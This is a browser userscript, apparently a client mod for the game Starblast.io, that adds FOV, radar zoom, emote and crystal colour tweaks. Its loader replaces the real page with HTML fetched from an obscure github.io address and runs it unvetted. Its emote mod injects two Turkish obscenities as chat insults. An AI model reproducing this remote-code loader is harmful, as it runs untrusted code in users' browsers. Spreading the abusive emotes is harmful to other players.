(function () {
  'use strict';

  // ---------------- Global Settings & Storage ----------------
  if (!window.sbCodeInjectors) window.sbCodeInjectors = [];
  window.modSettings = {
    fovEnabled: true,
    emoteCapacity: parseInt(localStorage.getItem('emote-capacity')) || 4,
    uiVisible: true,
    radarZoomEnabled: false
  };

  // ---------------- Crystal Color Fix ----------------
  const crystalColorMod = `
  /*
   * Enhanced Crystal Color Mod
   */
  window.updateCrystalColor = function(color) {
    try {
      localStorage.setItem('crystal-color', color);
      console.log('Saved crystal color to localStorage:', color);
      
      if (window.crystalMaterials && window.crystalMaterials.size > 0) {
        window.crystalMaterials.forEach(material => {
          if (material) {
            material.color.set(color);
            if (material.uniforms?.color) {
              material.uniforms.color.value.set(material.color);
            }
            material.needsUpdate = true;
          }
        });
        console.log('Updated crystal color for', window.crystalMaterials.size, 'materials');
      } else {
        console.log('No crystal materials found to update yet');
      }
    } catch (e) {
      console.error('Error updating crystal color:', e);
    }
  };

  window.crystalMaterials = new Set();

  const findCrystalObjects = () => {
    console.log('Attempting to find crystal objects...');
    for (const key in window) {
      try {
        const obj = window[key];
        if (
          obj?.prototype?.createModel &&
          typeof obj.prototype.createModel === 'function' &&
          obj.prototype.createModel.toString().includes('Crystal')
        ) {
          console.log('Found CrystalObject by createModel:', key);
          patchCrystalObject(obj);
          return true;
        }
      } catch (e) { /* ignore errors */ }
    }
    setTimeout(() => {
      console.log('Attempting secondary detection method...');
      try {
        let scene = null;
        for (const key in window) {
          if (window[key]?.type === 'Scene' && window[key].children) {
            scene = window[key];
            break;
          }
        }
        if (scene) {
          console.log('Found THREE.js scene, searching for crystal materials...');
          scene.traverse(object => {
            if (object.material && 
                (object.name.toLowerCase().includes('crystal') || 
                 object.parent?.name?.toLowerCase().includes('crystal'))) {
              window.crystalMaterials.add(object.material);
              console.log('Found crystal material in scene object:', object.name);
              const savedColor = localStorage.getItem('crystal-color');
              if (savedColor) {
                object.material.color.set(savedColor);
                if (object.material.uniforms?.color) {
                  object.material.uniforms.color.value.set(object.material.color);
                }
                object.material.needsUpdate = true;
              }
            }
          });
        }
      } catch (e) {
        console.warn('Error in secondary crystal detection:', e);
      }
    }, 5000);
    return false;
  };

  const patchCrystalObject = (CrystalClass) => {
    const originalGetModelInstance = CrystalClass.prototype.getModelInstance;
    CrystalClass.prototype.getModelInstance = function() {
      const instance = originalGetModelInstance.apply(this, arguments);
      if (this.material) {
        window.crystalMaterials.add(this.material);
        const savedColor = localStorage.getItem('crystal-color') || '#ffffff';
        this.material.color.set(savedColor);
        if (this.material.uniforms?.color) {
          this.material.uniforms.color.value.set(this.material.color);
        }
        this.material.needsUpdate = true;
        console.log('Applied color to crystal material:', savedColor);
      }
      return instance;
    };
    console.log('Successfully patched crystal object');
  };

  document.addEventListener('DOMContentLoaded', () => {
    const colorPicker = document.getElementById('crystal-color-picker');
    if (colorPicker) {
      const savedColor = localStorage.getItem('crystal-color') || '#ffffff';
      colorPicker.value = savedColor;
      colorPicker.addEventListener('input', (event) => {
        window.updateCrystalColor(event.target.value);
      });
      console.log('Crystal color picker initialized with color:', savedColor);
    }
    if (!findCrystalObjects()) {
      console.log('Primary crystal detection method failed, will try secondary method after delay');
    }
  });

  const materialObserver = new MutationObserver((mutations) => {
    mutations.forEach(mutation => {
      if (mutation.addedNodes) {
        mutation.addedNodes.forEach(node => {
          if (node.material) {
            window.crystalMaterials.add(node.material);
            const savedColor = localStorage.getItem('crystal-color');
            if (savedColor) {
              node.material.color.set(savedColor);
              node.material.needsUpdate = true;
            }
          }
        });
      }
    });
  });
  document.addEventListener('DOMContentLoaded', () => {
    try {
      materialObserver.observe(document.body, { childList: true, subtree: true });
    } catch (e) {
      console.warn('Could not initialize material observer:', e);
    }
  });
  `;


  // ---------------- Lowercase Name Mod ----------------
  const modName = "Lowercase Name";
  const logLowercase = (msg) => console.log(`%c[${modName}] ${msg}`, "color: #FF00A6");
  function lowercaseInjector(sbCode) {
    let src = sbCode;
    let prevSrc = src;
    function checkSrcChange() {
      if (src === prevSrc) throw new Error("replace did not work");
      prevSrc = src;
    }
    src = src.replace(/\.toUpperCase\(\)/g, "");
    const styleBlock = `
    <style>
      #player input { text-transform: none !important; }
    </style>
    `;
    src = src.replace('</head>', `${styleBlock}</head>`);
    checkSrcChange();
    logLowercase("Mod injected");
    return src;
  }

  // ---------------- Custom Emote Mod ----------------
  const emoteModName = "Custom Emote";
  const logEmote = (msg) => console.log(`%c[${emoteModName}] ${msg}`, "color: #FFA500");
  function emoteInjector(sbCode) {
    let src = sbCode;
    let prevSrc = src;
    function checkSrcChange() {
      if (src === prevSrc) throw new Error("replace did not work");
      prevSrc = src;
    }
    const vocabPattern = /(this\.vocabulary\s*=\s*\[[\s\S]*?\})/;
    const emotes = `,{
      text: "orosbu cocu",
      icon: "🤡",
      key: "J"
    },{
      text: "sikerim",
      icon: "⚠️",
      key: "V"
    }`;
    src = src.replace(vocabPattern, `$1${emotes}`);
    checkSrcChange();
    logEmote("Clown and warning emotes injected");
    return src;
  }

  // ---------------- FOV Editor Mod ----------------
  const fovModName = "FOV Editor";
  const logFOV = (msg) => console.log(`%c[${fovModName}] ${msg}`, "color: #00A6FF");
  window.I1000 = window.I1000 || {};
  window.I1000.baseFOV = 45;
  window.I1000.currentFOV = 45;
  function fovInjector(sbCode) {
    let src = sbCode;
    let prevSrc = src;
    function checkSrcChange() {
      if (src === prevSrc) {
        console.error("Replace did not work. Previous source and current source are identical.");
        throw new Error("replace did not work");
      }
      prevSrc = src;
    }
    const fovPattern = /this\.III00\.fov\s*=\s*45\s*\*\s*this\.IIl11\.III00\.zoom/g;
    if (!fovPattern.test(src)) {
      console.error("Pattern not found in source code:", fovPattern);
      throw new Error("Pattern not found in source code");
    }
    src = src.replace(fovPattern, 'this.III00.fov = (window.modSettings.fovEnabled ? window.I1000.currentFOV : 45) * this.IIl11.III00.zoom');
    checkSrcChange();

    const controlStyles = `
    <style>
      #mod-controls {
        position: fixed;
        top: 12px;
        left: 12px;
        z-index: 1000;
        font-family: 'Segoe UI', system-ui, sans-serif;
        user-select: none;
        background: rgba(16, 18, 27, 0.97);
        backdrop-filter: blur(8px);
        border-radius: 4px;
        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.25);
        color: #ffffff;
        padding: 0;
        width: 160px;
        border: 1px solid rgba(255, 255, 255, 0.12);
      }
      #mod-controls-header {
        cursor: pointer;
        padding: 10px 12px;
        background: rgba(255, 255, 255, 0.06);
        font-weight: 600;
        font-size: 13px;
        display: flex;
        align-items: center;
        gap: 8px;
        border-bottom: 1px solid rgba(255, 255, 255, 0.08);
      }
      #mod-controls-header::before {
        content: '⚙️';
        font-size: 14px;
        filter: drop-shadow(0 0 4px rgba(255, 65, 215, 0.3));
      }
      #mod-controls-panel {
        padding: 12px;
        display: none;
      }
      .mod-control {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin: 8px 0;
        font-size: 12px;
        color: rgba(255, 255, 255, 0.9);
      }
      .mod-control-slider {
        width: 100%;
        margin: 8px 0;
        height: 3px;
        background: rgba(255, 255, 255, 0.1);
        -webkit-appearance: none;
        appearance: none;
        outline: none;
        border-radius: 1px;
      }
      .mod-control-slider::-webkit-slider-thumb {
        -webkit-appearance: none;
        width: 12px;
        height: 12px;
        background: #ff41d7;
        border-radius: 2px;
        cursor: pointer;
        box-shadow: 0 1px 4px rgba(255, 65, 215, 0.3);
      }
      .mod-control-slider::-moz-range-thumb {
        width: 12px;
        height: 12px;
        background: #ff41d7;
        border-radius: 2px;
        cursor: pointer;
      }
      #crystal-color-picker {
        width: 24px;
        height: 24px;
        border: 1px solid rgba(255, 255, 255, 0.1);
        border-radius: 3px;
        padding: 0;
        cursor: pointer;
        background: transparent;
      }
      #fov-display {
        padding: 8px 12px;
        background: rgba(255, 255, 255, 0.06);
        font-size: 12px;
        display: flex;
        justify-content: space-between;
        margin-top: 6px;
      }
      input[type="checkbox"] {
        position: relative;
        width: 36px;
        height: 20px;
        -webkit-appearance: none;
        appearance: none;
        background: rgba(255, 255, 255, 0.1);
        border-radius: 2px;
        transition: background 0.2s ease;
      }
      input[type="checkbox"]::before {
        content: "";
        position: absolute;
        width: 16px;
        height: 16px;
        background: #fff;
        top: 2px;
        left: 2px;
        transform: translateX(0);
        transition: transform 0.2s ease;
        border-radius: 2px;
      }
      input[type="checkbox"]:checked {
        background: #ff41d7;
      }
      input[type="checkbox"]:checked::before {
        transform: translateX(14px);
      }
      .control-value {
        font-weight: 600;
        color: #ff41d7;
        min-width: 32px;
        text-align: right;
        font-size: 11px;
      }
      .section-title {
        font-size: 10px;
        color: rgba(255, 255, 255, 0.5);
        text-transform: uppercase;
        letter-spacing: 0.4px;
        margin: 12px 0 6px;
      }
    </style>
    `;

    const controlsHTML = `
    <div id="mod-controls" style="display: ${window.modSettings.uiVisible ? 'block' : 'none'}">
      <div id="mod-controls-header">EOT Client V3.0.2</div>
      <div id="mod-controls-panel">
        <div class="mod-control">
          <span>FOV</span>
          <input type="checkbox" id="fov-toggle" ${window.modSettings.fovEnabled ? 'checked' : ''}>
        </div>
        <div class="mod-control">
          <span>Emote Capacity</span>
          <div class="control-value" id="emote-capacity-value">${window.modSettings.emoteCapacity}</div>
        </div>
        <input type="range" min="1" max="5" value="${window.modSettings.emoteCapacity}" class="mod-control-slider" id="emote-capacity-slider">
        <div class="mod-control">
          <span>Radar Zoom</span>
          <input type="checkbox" id="radar-zoom-toggle" ${window.modSettings.radarZoomEnabled ? 'checked' : ''}>
        </div>
        <div class="mod-control">
          <span>Crystal Color</span>
          <input type="color" id="crystal-color-picker" value="#ffffff">
        </div>
      </div>
      <div id="fov-display">
        FOV: <span id="fov-value">45</span>
      </div>
    </div>
    `;

    src = src.replace('</body>', `
      ${controlStyles}
      ${controlsHTML}
      <script>
      ${emoteCapacityMod}
      ${crystalColorMod}

      const fovDisplay = document.getElementById('fov-display');

      document.addEventListener('wheel', (e) => {
        if (!window.modSettings.fovEnabled) return;
        e.preventDefault();
        const delta = e.deltaY < 0 ? 1 : -1;
        window.I1000.currentFOV = Math.max(1, Math.min(120, window.I1000.currentFOV + delta));
        document.getElementById('fov-value').textContent = window.I1000.currentFOV;
      }, { passive: false });

      document.addEventListener('DOMContentLoaded', () => {
        const controlsHeader = document.getElementById('mod-controls-header');
        const controlsPanel = document.getElementById('mod-controls-panel');
        const fovToggle = document.getElementById('fov-toggle');
        const emoteSlider = document.getElementById('emote-capacity-slider');
        const emoteValue = document.getElementById('emote-capacity-value');
        const radarZoomToggle = document.getElementById('radar-zoom-toggle');
        const crystalColorPicker = document.getElementById('crystal-color-picker');

        const savedCrystalColor = localStorage.getItem('crystal-color');
        if (savedCrystalColor) {
          crystalColorPicker.value = savedCrystalColor;
        }

        controlsHeader.addEventListener('click', () => {
          controlsPanel.style.display = controlsPanel.style.display === 'none' ? 'block' : 'none';
        });

        fovToggle.addEventListener('change', () => {
          window.modSettings.fovEnabled = fovToggle.checked;
          fovDisplay.style.display = fovToggle.checked ? 'block' : 'none';
        });

        emoteSlider.addEventListener('input', () => {
          const value = parseInt(emoteSlider.value);
          emoteValue.textContent = value;
          window.modSettings.emoteCapacity = value;
          localStorage.setItem('emote-capacity', value);
          if (window.ChatPanel) {
            ChatPanel.prototype.getEmotesCapacity = function() {
              return value;
            };
          }
        });

        radarZoomToggle.addEventListener('change', () => {
          window.modSettings.radarZoomEnabled = radarZoomToggle.checked;
          if (window.updateRadarZoom) {
            window.updateRadarZoom();
          }
        });

        crystalColorPicker.addEventListener('change', () => {
          const color = crystalColorPicker.value;
          if (window.updateCrystalColor) {
            window.updateCrystalColor(color);
          }
        });

        const savedCapacity = parseInt(localStorage.getItem('emote-capacity')) || 4;
        emoteSlider.value = savedCapacity;
        emoteValue.textContent = savedCapacity;
        window.modSettings.emoteCapacity = savedCapacity;
      });
      </script>
    </body>`);
    checkSrcChange();
    logFOV("FOV injector applied");
    return src;
  }

  // ---------------- Emote Capacity Mod ----------------
  const emoteCapacityMod = `
  let globalVal = ChatPanel.toString().match(/[0OlI1]{5}/)[0];
  ChatPanel.prototype.getEmotesCapacity = function() {
    const savedCapacity = parseInt(localStorage.getItem('emote-capacity')) || 4;
    return Math.min(Math.max(1, savedCapacity), 5);
  };
  ChatPanel.prototype.typed = Function("return " + ChatPanel.prototype.typed.toString().replace(/>=\\s*4/, " >= this.getEmotesCapacity()"))();
  if (window.modSettings && window.modSettings.emoteCapacity) {
    localStorage.setItem('emote-capacity', window.modSettings.emoteCapacity);
  }
  `;

  // ---------------- Radar Zoom Mod ----------------
  const radarZoomModName = "Radar Zoom Mod";
  const logRadarZoom = (msg) => console.log(`%c[${radarZoomModName}] ${msg}`, "color: #00FF00");
  function radarZoomInjector(sbCode) {
    let src = sbCode;
    let prevSrc = src;
    function checkSrcChange() {
      if (src === prevSrc) throw new Error("replace did not work");
      prevSrc = src;
    }
    const radarZoomScript = `
    // Radar Zoom Override Function
    window.updateRadarZoom = function() {
      console.log('Radar zoom setting changed to:', window.modSettings.radarZoomEnabled);
      const radarElements = document.querySelectorAll('.radar-element');
      radarElements.forEach(element => {
        element.style.transform = window.modSettings.radarZoomEnabled ? 'scale(1.5)' : '';
      });
      if (window.game && window.game.radar) {
        window.game.radar.zoom = window.modSettings.radarZoomEnabled ? 1.5 : 1;
        console.log('Updated radar zoom in game object');
      }
    };
    const radarCheckInterval = setInterval(() => {
      const radarContainer = document.querySelector('#radar, .radar, [class*="radar"]');
      if (radarContainer) {
        radarContainer.style.transform = window.modSettings.radarZoomEnabled ? 'scale(1.5)' : '';
        console.log('Applied radar zoom to container:', radarContainer);
      }
      if (document.readyState === 'complete' && performance.now() > 60000) {
        clearInterval(radarCheckInterval);
      }
    }, 2000);
    `;
    src = src.replace('</body>', radarZoomScript + '</body>');
    checkSrcChange();
    logRadarZoom("Radar zoom injector applied");
    return src;
  }

  // ---------------- Main Code Injection ----------------
  const log = (msg) => console.log(`%c[eot] ${msg}`, "color: #FF00E6");
  function injectLoader() {
    if (window.location.pathname !== "/") {
      log("Injection not needed");
      return;
    }
    document.open();
    document.write('<html><head><title></title></head><body style="background-color:#ffffff;"><div style="margin: auto; width: 50%;"><h1 style="text-align: center;padding: 170px 0;color: #000;"></h1><h1 style="text-align: center;color: #000;"></h1></div></body></html>');
    document.close();
    var url = 'https://assdsasdqwqeqdzcxznfcn1029d8919208nx9.github.io/OLUMUksmdmksladmkakmsak10911oms1ks1mklmkls11921ms1sımn1sösm2k1.html';
    url += '?_=' + new Date().getTime();
    var xhr = new XMLHttpRequest();
    log("Fetching custom source...");
    xhr.open("GET", url);
    xhr.onreadystatechange = function () {
      if (xhr.readyState === 4 && xhr.status === 200) {
        var starSRC = xhr.responseText;
        if (starSRC !== undefined) {
          log("Source fetched successfully");
          const start_time = performance.now();
          log("Applying mods...");
          if (!window.sbCodeInjectors) {
            log("No Starblast.io userscripts found to load");
          } else {
            let error_notified = false;
            for (const injector of window.sbCodeInjectors) {
              try {
                if (typeof injector === "function") starSRC = injector(starSRC);
                else {
                  log("Injector was not a function");
                  console.log(injector);
                }
              } catch (error) {
                if (!error_notified) {
                  alert("One of your Starblast.io userscripts failed to load");
                  error_notified = true;
                }
                console.error(error);
              }
            }
          }
          const end_time = performance.now();
          log(`Mods applied successfully (${(end_time - start_time).toFixed(0)}ms)`);
          document.open();
          document.write(starSRC);
          document.close();
        } else {
          log("Source fetch failed");
          alert("An error occurred while fetching game code");
        }
      }
    };
    xhr.send();
  }

// ---------------- Register Injector Functions ----------------
window.sbCodeInjectors.push((sbCode) => {
  try {
    return lowercaseInjector(sbCode);
  } catch (error) {
    alert(`${modName} failed to load; error: ${error}`);
    throw error;
  }
});

window.sbCodeInjectors.push((sbCode) => {
  try {
    return emoteInjector(sbCode);
  } catch (error) {
    alert(`${emoteModName} failed to load; error: ${error}`);
    throw error;
  }
});

window.sbCodeInjectors.push((sbCode) => {
  try {
    return fovInjector(sbCode);
  } catch (error) {
    alert(`${fovModName} failed to load; error: ${error}`);
    throw error;
  }
});

window.sbCodeInjectors.push((sbCode) => {
  try {
    return radarZoomInjector(sbCode);
  } catch (error) {
    alert(`${radarZoomModName} failed to load; error: ${error}`);
    throw error;
  }
});

// ---------------- Start the Injection ----------------
injectLoader();
})();
